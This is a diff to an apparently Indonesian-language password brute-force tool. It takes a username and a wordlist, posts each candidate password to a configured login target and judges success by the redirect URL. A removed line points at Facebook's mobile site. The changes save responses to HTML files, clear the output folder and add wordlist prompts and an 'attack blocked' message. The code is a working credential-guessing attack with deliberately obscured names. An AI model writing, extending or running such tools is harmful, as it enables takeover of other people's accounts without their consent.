@@ -8,7 +8,8 @@
 # Date: 13-06-2021
 
 
-import json,os as system, requests, time , random,sys
+import json,os as system, requests, time, shutil , random,sys
+from json.decoder import JSONDecodeError
 from colorama import Fore as init_a, Back, Style as ini_a
 from lib.core import api_printout as opt
 from lib.core import api_printfail as opf
@@ -58,11 +59,18 @@ def a1(init_b1,v,init_b3,index=50,total=50):
                 }
             
             e = requests.post(x[init]["Target"], data=n, headers=headers)
-            o = requests.get(ini2,headers=headers).json()
+
+            print(n)
+
 
             init_db1 = e.url
             percentage += 1
             init_db2 = e.text
+
+            name_output = "data/html/response{}.html".format(percentage)
+
+            with open(name_output, "w") as file:
+                file.write(init_db2)
 
             if init_db1.find(x[init]["path-raw"]) != -1:
                 print(f"✅ {n}")
@@ -86,11 +94,13 @@ def a1(init_b1,v,init_b3,index=50,total=50):
                         words = False
             else:
                 print("Request #{}".format(percentage))
-                print(f"❌ {init_db1}")
-                print(f"❌ {n}")
-                print(f"❌ {o}".replace('httpbin.org',"mbasic.facebook.com"))
+                print(f"{init_db1}")
+                print(f"{n}")
+                print(f"{system.getcwd()}/{name_output}")
                 print(x[f]["d"])
 
+    except JSONDecodeError as e:
+        print("❌ Serangan Diblockir. Coba Lagi")
     except requests.ConnectionError as err:
         raise SystemExit(err)
 
@@ -175,8 +185,19 @@ def main_attack(T):
 
         f = "http-characters"
 
-        for a in init_v2:
-            opt.printout(x[f]["c"] + x[a]["Target"] + x[f]["c"])
+        folder_path = "data/html"
+
+        if system.path.exists(folder_path) and system.path.isdir(folder_path):
+            # Menghapus semua file dalam folder
+            try:
+                for filename in system.listdir(folder_path):
+                    file_path = system.path.join(folder_path, filename)
+                    if system.path.isfile(file_path):
+                        system.remove(file_path)
+            except Exception as e:
+                print(f"Gagal Menyiapkan Serangan: {e}")
+        else:
+            print(f"Gagal Menyiapkan Serangan.")
 
 
         v = input(init_a.YELLOW + "   Username : " + ini_a.RESET_ALL)
@@ -241,10 +262,14 @@ def interactive():
             "http-warning"
         ]
 
+        opt.printout(x[f]["c"] + init_a.YELLOW + "📝 Persyaratan: Harus Sudah Memiliki Wordlists" + ini_a.RESET_ALL + x[f]["c"])
+        opt.printout(init_a.YELLOW + "📝 Masukan Wordlist: e.g /path/wordlists.txt " + ini_a.RESET_ALL + x[f]["c"])
+
         for a in value:
             opt.printout(x[f]["c"] + x[a]["Wordlists"] + x[f]["c"])
 
-        db_main = input(init_a.YELLOW + "   Wordlist : " + ini_a.RESET_ALL).lower()
+
+        db_main = input(init_a.YELLOW + "  🔥 Wordlist : " + ini_a.RESET_ALL).lower()
 
         if system.path.isfile(db_main):
             print("]")
